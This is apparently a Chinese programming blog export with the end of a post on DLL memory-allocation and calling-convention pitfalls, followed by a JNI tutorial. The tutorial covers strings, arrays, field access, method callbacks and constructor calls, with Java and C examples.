有了这些知识，你可以开始写一些简单的DLL的应用，但是我可以百分之百的肯定，你会遇到崩溃，而之前的非DLL的版本则没有问题。假如你通过显式加载来使用DLL，有可能会是调用约定不一致而引起崩溃，所谓调用约定就是函数声明前面加上__stdcall __cdecl等等限定词，注意一些宏如WINAPI会定义成这些限定词之一，不理解他们没关系，但是记住一定要保持一致，即声明和定义时一致，这在用隐式加载时不成问题，但是显示加载由于没有利用头文件，就有可能产生不一致。 调用约定并不是我真正要说的，虽然它是一种可能。我要说的是内存分配与释放的问题。请看下面代码： ``` Cvoid foo(string&amp; str) &#123; str = "hello"; &#125; int main() &#123; string str; foo(str); printf("%s\n", str.c_str()); return 0; &#125; 当函数foo和main在同一个工程中，或者foo在静态库中时，不会有问题，但是如果foo是一个DLL的导出函数时，请不要这么写，它有可能会导致崩溃[6]。崩溃的原因在于“一个模块中分配的内存在另一个模块中释放”，DLL与EXE分属两个模块，例子中foo里面赋值操作导致了内存分配，而main中return语句之后，string对象析构引起内存释放。我不想穷举全部的这类情况，只请大家在设计DLL接口时考虑清楚内存的分配释放问题，请遵循谁分配，谁释放的原则来进行。如果不知道该怎么设计，请抄袭我们常见的DLL接口–微软的API的做法，如：CreateDCReleaseDC的成对调用，一个函数分配了内存，另外一个函数用来释放内存。回到我们有可能崩溃的例子中来，怎么修改才能避免呢？这可以做为一个练习让读者来做，这个练习用的时间也许会比较长，如果你做好了，那么你差不多就出师了。一时想不到也不用急，我至少见过两个有五年以上经验的程序员依然犯这样的错误。 注[1]：为了说明的需要，我这里使用直接声明的方式，实际工程中是应该使用头文件的。注[2]: 还有线程创建与销毁也会路过DLL的入口，但是这对新手来说意义不大。注[3]：DEF文件格式很简单，关于DEF文件的例子，可以通过新建一个ATL COM工程看到。注[4]：第一种方法和使用静态库差不多，包含头文件，链接库文件，然后就像是使用普通函数一样，称为隐式加载。注[5]：具体调用方法请参阅MSDN。注[6]：之所以说有可能是因为，如果两个工程的设置都是采用动态连接到运行库，那么分配释放其实都在运行库的DLL中进行，那么这种情况便不会发生崩溃]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JNI插件编程]]></title>
    <url>%2F2017%2F06%2F04%2Ffirst%2F</url>
    <content type="text"><![CDATA[JNI使用范围1、 在Java程序中复用以前写过的C/C++代码。 2、 自己实现一个java虚拟机 3、 学习不同语言如何进行协作，尤其是如何实现垃圾回收和多线程。 4、 把一个虚拟机实现整合到用C/C++写的程序中。 hello world1、 创建一个类（HelloWorld.java）声明本地方法。2、 使用javac编译源文件HollowWorld.java，产生HelloWorld.class。使用javah –jni来生成C头文件（HelloWorld.h），这个头文件里面包含了本地方法的函数原型。3、 用C代码写函数原型的实现。4、 把C函数实现编译成一个本地库，创建Hello-World.dll或者libHello-World.so。5、 使用java命令运行HelloWorld程序，类文件HelloWorld.class和本地库(HelloWorld.dll或者libHelloWorld.so)在运行时被加载。 1234567891011121314151617package com.jni.demo;public class MyJNI &#123; /** * @param args */ public native void sayhello(); public static void main(String[] args) &#123; // TODO Auto-generated method stub System.loadLibrary("MyJNI"); MyJNI demo = new MyJNI(); demo.sayhello(); System.out.println("wo"); &#125;&#125; 12345678910111213141516171819202122com_jni_demo.MyJNI.h/* DO NOT EDIT THIS FILE - it is machine generated */#include "jni.h"/* Header for class com_jni_demo_MyJNI */#ifndef _Included_com_jni_demo_MyJNI#define _Included_com_jni_demo_MyJNI#ifdef __cplusplusextern "C" &#123;#endif/* * Class: com_jni_demo_MyJNI * Method: sayhello * Signature: ()V */JNIEXPORT void JNICALL Java_com_jni_demo_MyJNI_sayhello (JNIEnv *, jobject);#ifdef __cplusplus&#125;#endif#endif 12345678MyJNI.cpp# include&lt;iostream&gt;# include "jni.h"# include "com_jni_demo_MyJNI.h"using namespace std;JNIEXPORT void JNICALL Java_com_jni_demo_MyJNI_sayhello(JNIEnv * env,jobject obj)&#123; printf("hello,world");&#125; 基本类型、字符串、数组示例java端源代码 12345678910111213141516171819202122232425class Prompt &#123; // native method that prints a prompt and reads a line private native String getLine(String prompt); public static void main(String args[]) &#123; Prompt p = new Prompt(); String input = p.getLine("Type a line: "); System.out.println("User typed: " + input); &#125; static &#123; System.loadLibrary("Prompt"); &#125; &#125; 本地方法的C函数原型C函数原型 12345Prompt.getLine方法可以用下面这个C函数来实现：JNIEXPORT jstring JNICALL Java_Prompt_getLine(JNIEnv *env, jobject this, jstring prompt); 其中，JNIEXPORT和JNICALL这两个宏（被定义在jni.h）确保这个函数在本地库外可见，并且C编译器会进行正确的调用转换。 本地方法参数第一个参数JNIEnv接口指针，指向一个个函数表，函数表中的每一个入口指向一个JNI函数。本地方法经常通过这些函数来访问JVM中的数据结构。第二个参数根据本地方法是一个静态方法还是实例方法而有所不同。本地方法是一个静态方法时，第二个参数代表本地方法所在的类；本地方法是一个实例方法时，第二个参数代表本地方法所在的对象。我们的例子当中，Java_Prompt_getLine是一个实例方法，因此jobject参数指向方法所在的对象。 类型映射AVA中有两种类型：基本数据类型（int,float,char等）和引用类型（类，对象，数组等）。JNI对基本类型和引用类型的处理是不同的。基本类型的映射是一对一的。例如JAVA中的int类型直接对应C/C++中的jint（定义在jni.h中的一个有符号 32位整数）。NI把JAVA中的对象当作一个C指针传递到本地方法中，这个指针指向JVM中的内部数据结构，而内部数据结构在内存中的存储方式是不可见的。本地代码必须通过在JNIEnv中选择适当的JNI函数来操作JVM中的对象。例如，对于java.lang.String对应的JNI类型是jstring，但本地代码只能通过GetStringUTFChars这样的JNI函数来访问字符串的内容。所有的JNI引用都是jobject类型，对了使用方便和类型安全，JNI定义了一个引用类型集合，集合当中的所有类型都是jobject的子类型。这些子类型和JAVA中常用的引用类型相对应。例如，jstring表示字符串，jobjectArray表示对象数组。 访问字符串Java_Prompt_getLine接收一个jstring类型的参数prompt，jstring类型指向JVM内部的一个字符串，和常规的C字符串类型char*不同。你不能把jstring当作一个普通的C字符串。 转换为本地字符串本地代码中，必须使用合适的JNI函数把jstring转化为C/C++字符串。JNI支持字符串在Unicode和UTF-8两种编码之间转换。Unicode字符串代表了16-bit的字符集合。UTF-8字符串使用一种向上兼容7-bit ASCII字符串的编码协议。UTF-8字符串很像NULL结尾的C字符串，在包含非ASCII字符的时候依然如此。所有的7-bitASCII字符的值都在1~127之间，这些值在UTF-8编码中保持原样。一个字节如果最高位被设置了，意味着这是一个多字节字符（16-bitUnicode值）。函数Java_Prompt_getLine通过调用JNI函数GetStringUTFChars来读取字符串的内容。GetStringUTFChars可以把一个jstring指针（指向JVM内部的Unicode字符序列）转化成一个UTF-8格式的C字符串。如何你确信原始字符串数据只包含7-bit ASCII字符，你可以把转化后的字符串传递给常规的C库函数使用，如printf。 1234567891011121314151617181920212223242526272829JNIEXPORT jstring JNICALL Java_Prompt_getLine(JNIEnv *env, jobject obj, jstring prompt) &#123; char buf[128]; const jbyte *str; str = (*env)-&gt;GetStringUTFChars(env, prompt, NULL); if (str == NULL) &#123; return NULL; /* OutOfMemoryError already thrown */ &#125; printf("%s", str); (*env)-&gt;ReleaseStringUTFChars(env, prompt, str); /* We assume here that the user does not type more than * 127 characters */ scanf("%s", buf); return 不要忘记检查GetStringUTFChars。因为JVM需要为新诞生的UTF-8字符串分配内存，这个操作有可能因为内存太少而失败。失败时，GetStringUTFChars会返回NULL，并抛出一个OutOfMemoryError异常（对异常的处理在第6章）。这些JNI抛出的异常与JAVA中的异常是不同的。一个由JNI抛出的未决的异常不会改变程序执行流，因此，我们需要一个显示的return语句来跳过C函数中的剩余语句。Java_Prompt_getLine函数返回后，异常会在Prompt.main（Prompt.getLine这个发生异常的函数的调用者）中抛出， 释放本地字符串资源从GetStringUTFChars中获取的UTF-8字符串在本地代码中使用完毕后，要使用ReleaseStringUTFChars告诉JVM这个UTF-8字符串不会被使用了，因为这个UTF-8字符串占用的内存会被回收。 构造新的字符串你可以通过JNI函数NewStringUTF在本地方法中创建一个新的java.lang.String字符串对象。这个新创建的字符串对象拥有一个与给定的UTF-8编码的C类型字符串内容相同的Unicode编码字符串。如果一个VM不能为构造java.lang.String分配足够的内存，NewStringUTF会抛出一个OutOfMemoryError异常，并返回一个NULL。在这个例子中，我们不必检查它的返回值，因为本地方法会立即返回。如果NewStringUTF失败，OutOfMemoryError这个异常会被在Prompt.main（本地方法的调用者）中抛出。如果NeweStringUTF成功，它会返回一个JNI引用，这个引用指向新创建的java.lang.String对象。这个对象被Prompt.getLine返回然后被赋值给Prompt.main中的本地input。 其它JNI字符串处理函数JNI支持许多操作字符串的函数，这里做个大致介绍。GetStringChars和ReleaseStringChars获取以Unicode格式编码的字符串。当操作系统支持Unicode编码的字符串时，这些方法很有用。UTF-8字符串以’\0’结尾，而Unicode字符串不是。如果jstring指向一个Unicode编码的字符串，为了得到这个字符串的长度，可以调用GetStringLength。如果一个jstring指向一个UTF-8编码的字符串，为了得到这个字符串的字节长度，可以调用标准C函数strlen。或者直接对jstring调用JNI函数GetStringUTFLength，而不用管jstring指向的字符串的编码格式。GetStringChars和GetStringUTFChars函数中的第三个参数需要更进一步的解释：const jchar GetStringChars(JNIEnv env, jstring str, jboolean *isCopy);当从JNI函数GetStringChars中返回得到字符串B时，如果B是原始字符串java.lang.String的拷贝，则isCopy被赋值为JNI_TRUE。如果B和原始字符串指向的是JVM中的同一份数据，则isCopy被赋值为JNI_FALSE。当isCopy值为JNI_FALSE时，本地代码决不能修改字符串的内容，否则JVM中的原始字符串也会被修改，这会打破JAVA语言中字符串不可变的规则。通常，因为你不必关心JVM是否会返回原始字符串的拷贝，你只需要为isCopy传递NULL作为参数。JVM是否会通过拷贝原始Unicode字符串来生成UTF-8字符串是不可以预测的，程序员最好假设它会进行拷贝，而这个操作是花费时间和内存的。一个典型的JVM会在heap上为对象分配内存。一旦一个JAVA字符串对象的指针被传递给本地代码，GC就不会再碰这个字符串。换言之，这种情况下，JVM必须pin这个对象。可是，大量地pin一个对象是会产生内存碎片的，因为，虚拟机会随意性地来选择是复制还是直接传递指针。当你不再使用一个从GetStringChars得到的字符串时，不管JVM内部是采用复制还是直接传递指针的方式，都不要忘记调用ReleaseStringChars。根据方法GetStringChars是复制还是直接返回指针，ReleaseStringChars会释放复制对象时所占的内存，或者unpin这个对象。 新JNI函数为了提高JVM返回字符串直接指针的可能性，JDK1.2中引入了一对新函数，Get/ReleaseStringCritical。表面上，它们和Get/ReleaseStringChars函数差不多，但实际上这两个函数在使用有很大的限制。 使用这两个函数时，你必须两个函数中间的代码是运行在”critical region”（临界区）的，即，这两个函数中间的本地代码不能调用任何会让线程阻塞或等待JVM中的其它线程的本地函数或JNI函数。 有了这些限制， JVM就可以在本地方法持有一个从GetStringCritical得到的字符串的直接指针时禁止GC。当GC被禁止时，任何线程如果触发GC的话，都会被阻塞。而Get/ReleaseStringCritical这两个函数中间的任何本地代码都不可以执行会导致阻塞的调用或者为新对象在JVM中分配内存。否则，JVM有可能死锁，想象一下这样的场景中： 1、 只有当前线程触发的GC完成阻塞并释放GC时，由其它线程触发的GC才可能由阻塞中释放出来继续运行。 2、 在这个过程中，当前线程会一直阻塞。因为任何阻塞性调用都需要获取一个正被其它线程持有的锁，而其它线程正等待GC。 Get/ReleaseStringCritical的交迭调用是安全的，这种情况下，它们的使用必须有严格的顺序限制。而且，我们一定要记住检查是否因为内存溢出而导致它的返回值是NULL。因为JVM在执行GetStringCritical这个函数时，仍有发生数据复制的可能性，尤其是当JVM内部存储的数组不连续时，为了返回一个指向连续内存空间的指针，JVM必须复制所有数据。 总之，为了避免死锁，在Get/ReleaseStringCritical之间不要调用任何JNI函数。Get/ReleaseStringCritical和 Get/ReleasePrimitiveArrayCritical这两个函数是可以的。 下面代码演示了这对函数的正确用法： 1234567891011121314151617181920212223242526jchar *s1, *s2; s1 = (*env)-&gt;GetStringCritical(env, jstr1); if (s1 == NULL) &#123; ... /* error handling */ &#125; s2 = (*env)-&gt;GetStringCritical(env, jstr2); if (s2 == NULL) &#123; (*env)-&gt;ReleaseStringCritical(env, jstr1, s1); ... /* error handling */ &#125; ... /* use s1 and s2 */ (*env)-&gt;ReleaseStringCritical(env, jstr1, s1); (*env)-&gt;ReleaseStringCritical(env, jstr2, s2); JNI不支持Get/ReleaseStringUTFCritical，因为这样的函数在进行编码转换时很可能会促使JVM对数据进行复制，因为JVM内部表示字符串一般都是使用Unicode的。 JDK1.2还一对新增的函数：GetStringRegion和GetStringUTFRegion。这对函数把字符串复制到一个预先分配的缓冲区内。Prompt.getLine这个本地方法可以用GetStringUTFRegion重新实现如下： 1234567891011121314151617181920212223JNIEXPORT jstring JNICALL Java_Prompt_getLine(JNIEnv *env, jobject obj, jstring prompt) &#123; /* assume the prompt string and user input has less than 128 characters */ char outbuf[128], inbuf[128]; int len = (*env)-&gt;GetStringLength(env, prompt); (*env)-&gt;GetStringUTFRegion(env, prompt, 0, len, outbuf); printf("%s", outbuf); scanf("%s", inbuf); return (*env)-&gt;NewStringUTF(env, inbuf); &#125; GetStringUTFRegion这个函数会做越界检查，如果必要的话，会抛出异常StringIndexOutOfBoundsException。这个方法与GetStringUTFChars比较相似，不同的是，GetStringUTFRegion不做任何内存分配，不会抛出内存溢出异常。 JNI字符串操作函数总结对于小字符串来说，Get/SetStringRegion和Get/SetString-UTFRegion这两对函数是最佳选择，因为缓冲区可以被编译器提前分配，而且永远不会产生内存溢出的异常。当你需要处理一个字符串的一部分时，使用这对函数也是不错的，因为它们提供了一个开始索引和子字符串的长度值。另外，复制少量字符串的消耗是非常小的。 在使用GetStringCritical时，必须非常小心。你必须确保在持有一个由GetStringCritical获取到的指针时，本地代码不会在JVM内部分配新对象，或者做任何其它可能导致系统死锁的阻塞性调用。 下面的例子演示了使用GetStringCritical时需要注意的一些地方： 1234567891011121314/* This is not safe! */ const char *c_str = (*env)-&gt;GetStringCritical(env, j_str, 0); if (c_str == NULL) &#123; ... /* error handling */ &#125; fprintf(fd, "%s\n", c_str); (*env)-&gt;ReleaseStringCritical(env, j_str, c_str); 上面代码的问题在于，GC被当前线程禁止的情况下，向一个文件写数据不一定安全。例如，另外一个线程T正在等待从文件fd中读取数据。假设操作系统的规则是fprintf会等待线程T完成所有对文件fd的数据读取操作，这种情况下就可能会产生死锁：线程T从文件fd中读取数据是需要缓冲区的，如果当前没有足够内存，线程T就会请求GC来回收一部分，GC一旦运行，就只能等到当前线程运行ReleaseStringCritical时才可以。而ReleaseStringCritical只有在fprintf调用返回时才会被调用。而fprintf这个调用，会一直等待线程T完成文件读取操作。 访问数组JNI在处理基本类型数组和对象数组上面是不同的。对象数组里面是一些指向对象实例或者其它数组的引用。本地代码中访问JVM中的数组和访问JVM中的字符串有些相似。看一个简单的例子。下面的程序调用了一个本地方法sumArray，这个方法对一个int数组里面的元素进行累加：1234567891011121314151617181920212223242526272829class IntArray &#123; private native int sumArray(int[] arr); public static void main(String[] args) &#123; IntArray p = new IntArray(); int arr[] = new int[10]; for (int i = 0; i &lt; 10; i++) &#123; arr[i] = i; &#125; int sum = p.sumArray(arr); System.out.println("sum = " + sum); &#125; static &#123; System.loadLibrary("IntArray"); &#125; &#125; 在本地代码中访问数组数组的引用类型是一般是jarray或者或者jarray的子类型jintArray。就像jstring不是一个C字符串类型一样，jarray也不是一个C数组类型。所以，不要直接访问jarray。你必须使用合适的JNI函数来访问基本数组元素：123456789101112131415161718192021JNIEXPORT jint JNICALL Java_IntArray_sumArray(JNIEnv *env, jobject obj, jintArray arr) &#123; jint buf[10]; jint i, sum = 0; (*env)-&gt;GetIntArrayRegion(env, arr, 0, 10, buf); for (i = 0; i &lt; 10; i++) &#123; sum += buf[i]; &#125; return sum; &#125; 访问字段JAVA支持两种field（字段），每一个对象的实例都有一个对象字段的复制；所有的对象共享一个类的静态字段。本地方法使用JNI提供的函数可以获取和修改这两种字段。先看一个从本地代码中访问对象字段的例子： 1234567891011121314151617181920212223242526272829class InstanceFieldAccess &#123; private String s; private native void accessField(); public static void main(String args[]) &#123; InstanceFieldAccess c = new InstanceFieldAccess(); c.s = "abc"; c.accessField(); System.out.println("In Java:"); System.out.println(" c.s = \"" + c.s + "\""); &#125; static &#123; System.loadLibrary("InstanceFieldAccess"); &#125; &#125; InstanceFieldAccess这个类定义了一个对象字段s。main方法创建了一个对象并设置s的值，然后调用本地方法InstanceFieldAccess.accessField在本地代码中打印s的值，并把它修改为一个新值。本地方法返回后，JAVA中把这个值再打印一次，可以看出来，字段s的值已经被改变了。下面是本地方法的实现：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677JNIEXPORT void JNICALL Java_InstanceFieldAccess_accessField(JNIEnv *env, jobject obj) &#123; jfieldID fid; /* store the field ID */ jstring jstr; const char *str; /* Get a reference to obj's class */ jclass cls = (*env)-&gt;GetObjectClass(env, obj); printf("In C:\n"); /* Look for the instance field s in cls */ fid = (*env)-&gt;GetFieldID(env, cls, "s", "Ljava/lang/String;"); if (fid == NULL) &#123; return; /* failed to find the field */ &#125; /* Read the instance field s */ jstr = (*env)-&gt;GetObjectField(env, obj, fid); str = (*env)-&gt;GetStringUTFChars(env, jstr, NULL); if (str == NULL) &#123; return; /* out of memory */ &#125; printf(" c.s = \"%s\"\n", str); (*env)-&gt;ReleaseStringUTFChars(env, jstr, str); /* Create a new string and overwrite the instance field */ jstr = (*env)-&gt;NewStringUTF(env, "123"); if (jstr == NULL) &#123; return; /* out of memory */ &#125; (*env)-&gt;SetObjectField(env, obj, fid, jstr); &#125;运行程序，得到输出为：In C: c.s = "abc" In Java: c.s = "123" 访问一个对象字段的流程为了访问一个对象的实例字段，本地方法需要做两步： 首先，通过在类引用上调用GetFieldID获取field ID（字段ID）、字段名字和字段描述符： Fid=(env)-&gt;GetFieldID(env,cls,”s”,”Ljava/lang/String;”);上例中的代码通过在对象引用obj上调用GetObjectClass获取到类引用。一旦获取到字段ID，你就可以把对象和字段ID作为参数来访问字段：Jstr=(env)-&gt;GetObjectField(env,obj,fid);因为字符串和数组是特殊的对象，所以我们使用GetObjectField来访问字符串类型的实例字段。除了Get/SetObjectField，JNI还支持其它如GetIntField、SetFloatField等用来访问基本类型字段的函数。 字段描述符在上一节我们使用过一个特殊的C字符串“Ljava/lang/String”来代表一个JVM中的字段类型。这个字符串被称为JNI field descriptor（字段描述符）。字符串的内容由字段被声明的类型决定。例如，使用“I”来表示一个int类型的字段，“F”来表示一个float类型的字段，“D”来表示一个double类型的字段，“Z”来表示一个boolean类型的字段等等。像java.lang.String这样的引用类型的描述符都是以L开头，后面跟着一个JNI类描述符，以分号结尾。一个JAVA类的全名中的包名分隔符“.”被转化成“/”。因此，对于一个字段类型的字段来说，它的描述符是“Ljava/lang/String”。数组的描述符中包含“]”字符，后面会跟着数组类型的描述符，如“[I”是int[]类型的字段的描述符。 访问静态字段访问静态字段和访问实例字段相似，看下面这个InstanceFieldAccess例子的变形： 1234567891011121314151617181920212223242526272829class StaticFielcdAccess &#123; private static int si; private native void accessField(); public static void main(String args[]) &#123; StaticFieldAccess c = new StaticFieldAccess(); StaticFieldAccess.si = 100; c.accessField(); System.out.println("In Java:"); System.out.println(" StaticFieldAccess.si = " + si); &#125; static &#123; System.loadLibrary("StaticFieldAccess"); &#125; &#125; StaticFieldAccess这个类包含一个静态字段si，main方法创建了一个对象，初始化静态字段，然后调用本地方法StaticFieldAccess.accessField在本地代码中打印静态字段中的值，然后设置新的值，为了演示这个值确实被改变了，在本地方法返回后，JAVA中再次这个静态字段的值。 下面是本地方法StaticFieldAccess.accessField的实现：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051JNIEXPORT void JNICALL Java_StaticFieldAccess_accessField(JNIEnv *env, jobject obj) &#123; jfieldID fid; /* store the field ID */ jint si; /* Get a reference to obj's class */ jclass cls = (*env)-&gt;GetObjectClass(env, obj); printf("In C:\n"); /* Look for the static field si in cls */ fid = (*env)-&gt;GetStaticFieldID(env, cls, "si", "I"); if (fid == NULL) &#123; return; /* field not found */ &#125; /* Access the static field si */ si = (*env)-&gt;GetStaticIntField(env, cls, fid); printf(" StaticFieldAccess.si = %d\n", si); (*env)-&gt;SetStaticIntField(env, cls, fid, 200); &#125;运行程序可得到输出结果：In C: StaticFieldAccess.si = 100 In Java: StaticFieldAccess.si = 200 访问静态字段和对象实例字段的不同点访问静态字段使用GetStaticFieldID，而访问对象的实例字段使用GetFieldID，但是，这两个方法都有相同的返回值类型：jfieldID。 调用方法JAVA中有几种不同类型的方法，实例方法必须在一个类的某个对象实例上面调用。而静态方法可以在任何一个对象实例上调用。对于构建方法的调用我们推迟到下一节。JNI支持一系列完整的函数让你可以在本地代码中回调JAVA方法，下面例子演示了如何从本地代码中调用一个JAVA中的实例方法：12345678910111213141516171819202122232425class InstanceMethodCall &#123; private native void nativeMethod(); private void callback() &#123; System.out.println("In Java"); &#125; public static void main(String args[]) &#123; InstanceMethodCall c = new InstanceMethodCall(); c.nativeMethod(); &#125; static &#123; System.loadLibrary("InstanceMethodCall"); &#125; &#125; 下面的是本地方法的实现：1234567891011121314151617181920212223JNIEXPORT void JNICALL Java_InstanceMethodCall_nativeMethod(JNIEnv *env, jobject obj) &#123; jclass cls = (*env)-&gt;GetObjectClass(env, obj); jmethodID mid = (*env)-&gt;GetMethodID(env, cls, "callback", "()V"); if (mid == NULL) &#123; return; /* method not found */ &#125; printf("In C\n"); (*env)-&gt;CallVoidMethod(env, obj, mid); &#125; 调用实例方法1、 本地方法首先调用JNI函数GetMethodID。这个函数在指定的类中寻找相应的方法。这个寻找过程是基于方法描述符的。如果方法不存在，GetMethodID返回NULL。这时，立即从本地方法中返回，并引发一个NoSuchMethodError错误。2、 本地方法通过调用CallVoidMethod来调用返回值为void的实例方法。除了CallVoidMethod这个函数以外，JNI也支持对返回值为其它类型的方法的调用。如果你调用的方法返回值类型为int，你的本地方法会使用CallIntMethod。类似地，你可以调用CallObjectMethod来调用返回值为java.lang.String、数组等对象类型的方法。你也可以使用CallMethod系列的函数来调用接口方法。你必须从接口类型中获取方法ID，下面的代码演示了如何在java.lang.Thread实例上面调用Runnable.run方法： 12345678910111213141516171819202122232425jobject thd = ...; /* a java.lang.Thread instance */ jmethodID mid; jclass runnableIntf = (*env)-&gt;FindClass(env, "java/lang/Runnable"); if (runnableIntf == NULL) &#123; ... /* error handling */ &#125; mid = (*env)-&gt;GetMethodID(env, runnableIntf, "run", "()V"); if (mid == NULL) &#123; ... /* error handling */ &#125; (*env)-&gt;CallVoidMethod(env, thd, mid); ... /* check for possible exceptions */ 生成方法描述符JNI中描述字段使用字段描述符，描述方法同样有方法描述符。一个方法描述符包含参数类型和返回值类型。参数类型出现在前面，并由一对圆括号将它们括起来，参数类型按它们在方法声明中出现的顺序被列出来，并且多个参数类型之间没有分隔符。如果一个方法没有参数，被表示为一对空圆括号。方法的返回值类型紧跟参数类型的右括号后面。例如，“（I）V”表示这个方法的一个参数类型为int，并且有一个void类回值。“（）D”表示这个方法没有参数，返回值类型为double。方法描述符中可能会包含类描述符，如方法native private String getLine(String);的描述符为：“(Ljava/lang/String;)Ljava/lang/String;”数组类型的描述符以“[”开头，后面跟着数组元素类型的描述符。如，public static void main(String[] args);的描述符是：”([Ljava/lang/String;)V” 调用静态方法1、 通过GetStaticMethodID获取方法ID。对应于调用实例方法时的GetMethodID。2、 传入类、方法ID、参数，并调用提供静态方法调用功能的JNI系列函数中的一个，如：CallStaticVoidMethod，CallStaticBooleanMethod等。调用静态方法和调用实例方法的JNI函数有一个很大的不同，前者第二个参数是类引用，后者是对象实例的引用。在JAVA访问一个静态方法可以通过类，也可以通过对象实例。而JNI的规定是，在本地代码中回调JAVA中的静态方法时，必须指定一个类引用才行。下面的例子演示了这个用法： 12345678910111213141516171819202122232425class StaticMethodCall &#123; private native void nativeMethod(); private static void callback() &#123; System.out.println("In Java"); &#125; public static void main(String args[]) &#123; StaticMethodCall c = new StaticMethodCall(); c.nativeMethod(); &#125; static &#123; System.loadLibrary("StaticMethodCall"); &#125; &#125; 下面是本地方法的实现：123456789101112131415161718192021222324JNIEXPORT void JNICALL Java_StaticMethodCall_nativeMethod(JNIEnv *env, jobject obj) &#123; jclass cls = (*env)-&gt;GetObjectClass(env, obj); jmethodID mid = (*env)-&gt;GetStaticMethodID(env, cls, "callback", "()V"); if (mid == NULL) &#123; return; /* method not found */ &#125; printf("In C\n"); (*env)-&gt;CallStaticVoidMethod(env, cls, mid); &#125; 当调用CallStaticVoidMethod时，确保你传入的是类引用cls而不是对象引用obj。运行程序，输出为： In C In Java 调用父类的实例方法如果一个方法被定义在父类中，在子类中被覆盖，你也可以调用这个实例方法。JNI提供了一系列完成这些功能的函数：CallNonvirtualMethod。为了调用一个定义在父类中的实例方法，你必须遵守下面的步骤：1、 使用GetMethodID从一个指向父类的引用当中获取方法ID。2、 传入对象、父类、方法ID和参数，并调用CallNonvirtualVoidMethod、CallNonvirtualBooleanMethod等一系列函数中的一个。这种调用父类实例方法的情况其实很少遇到，通常在JAVA中可以很简单地做到：super.f(); 调用构造函数JNI中，构造函数可以和实例方法一样被调用，调用方式也相似。传入“”作为方法名，“V”作为返回类型。你可以通过向JNI函数NewObject传入方法来调用构造函数。下面的代码实现了与JNI函数NewString相同的功能：把存储在C缓冲区内的Unicode编码的字符序列，创建成一个java.lang.String对象： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667jstring MyNewString(JNIEnv *env, jchar *chars, jint len) &#123; jclass stringClass; jmethodID cid; jcharArray elemArr; jstring result; stringClass = (*env)-&gt;FindClass(env, "java/lang/String"); if (stringClass == NULL) &#123; return NULL; /* exception thrown */ &#125; /* Get the method ID for the String(char[]) constructor */ cid = (*env)-&gt;GetMethodID(env, stringClass, "&lt;init&gt;", "([C)V"); if (cid == NULL) &#123; return NULL; /* exception thrown */ &#125; /* Create a char[] that holds the string characters */ elemArr = (*env)-&gt;NewCharArray(env, len); if (elemArr == NULL) &#123; return NULL; /* exception thrown */ &#125; (*env)-&gt;SetCharArrayRegion(env, elemArr, 0, len, chars); /* Construct a java.lang.String object */ result = (*env)-&gt;NewObject(env, stringClass, cid, elemArr); /* Free local references */ (*env)-&gt;DeleteLocalRef(env, elemArr); (*env)-&gt;DeleteLocalRef(env, stringClass); return result; &#125; 上面这个本地方法有些复杂，需要详细解释一下。首先，FindClass返回一个java.lang.String类的引用，接着，GetMethodID返回构造函数String(char[] chars)的方法ID。我们调用NewCharArray分配一个字符数组来保存字符串元素。JNI函数NewObject调用方法ID所标识的构造函数。NewObject函数需要的参数有：类的引用、构造方法的ID、构造方法需要的参数。这个例子引出了一个问题，既然我们可以利用JNI函数来实现相同的功能，为什么JNI还需要NewString这样的内置函数？原因是，内置函数的效率远高于在本地代码里面调用构造函数的API。而字符串又是最常用到的对象类型，因此需要在JNI中给予特殊的支持。你也可以做到通过CallNonvirtualVoidMethod函数来调用构造函数。这种情况下，本地代码必须首先通过调用AllocObject函数创建一个未初始化的对象。上面例子中的result = (*env)-&gt;NewObject(env, stringClass, cid, elemArr);可以被如下代码替换：12345678910111213141516171819result = (*env)-&gt;AllocObject(env, stringClass); if (result) &#123; (*env)-&gt;CallNonvirtualVoidMethod(env, result, stringClass, cid, elemArr); /* we need to check for possible exceptions */ if ((*env)-&gt;ExceptionCheck(env)) &#123; (*env)-&gt;DeleteLocalRef(env, result); result = NULL; &#125; &#125; AllocObject创建了一个未初始化的对象，使用时一定要非常小心，确保一个对象上面，构造函数最多被调用一次。本地代码不应该在一个对象上面调用多次构造函数。有时，你可能会发现创建一个未初始化的对象然后一段时间以后再调用构造函数的方式是很有用的。尽管如此，大部分情况下，你应该使用NewObject，尽量避免使用容易出错的AllocObject/CallNonvirtualVoidMethod方法。 缓存字段ID和方法ID使用时缓存字段ID和方法ID可以在字段的值被访问或者方法被回调的时候缓存起来。下面的代码中把字段ID存储在静态变量当中，这样当本地方法被重复调用时，不必重新搜索字段ID： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465JNIEXPORT void JNICALL Java_InstanceFieldAccess_accessField(JNIEnv *env, jobject obj) &#123; static jfieldID fid_s = NULL; /* cached field ID for s */ jclass cls = (*env)-&gt;GetObjectClass(env, obj); jstring jstr; const char *str; if (fid_s == NULL) &#123; fid_s = (*env)-&gt;GetFieldID(env, cls, "s", "Ljava/lang/String;"); if (fid_s == NULL) &#123; return; /* exception already thrown */ &#125; &#125; printf("In C:\n"); jstr = (*env)-&gt;GetObjectField(env, obj, fid_s); str = (*env)-&gt;GetStringUTFChars(env, jstr, NULL); if (str == NULL) &#123; return; /* out of memory */ &#125; printf(" c.s = \"%s\"\n", str); (*env)-&gt;ReleaseStringUTFChars(env, jstr, str); jstr = (*env)-&gt;NewStringUTF(env, "123"); if (jstr == NULL) &#123; return; /* out of memory */ &#125; (*env)-&gt;SetObjectField(env, obj, fid_s, jstr); &#125; 由于多个线程可能同时访问这个本地方法，上面方法中的代码很可能会导致混乱，其实没事，多个线程计算的ID其实是相同的。同样的思想，我们也可以缓存java.lang.String的构造方法的ID： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146jstring MyNewString(JNIEnv *env, jchar *chars, jint len) &#123; jclass stringClass; jcharArray elemArr; static jmethodID cid = NULL; jstring result; stringClass = (*env)-&gt;FindClass(env, "java/lang/String"); if (stringClass == NULL) &#123; return NULL; /* exception thrown */ &#125; /* Note that cid is a static variable */ if (cid == NULL) &#123; /* Get the method ID for the String constructor */ cid = (*env)-&gt;GetMethodID(env, stringClass, "&lt;init&gt;", 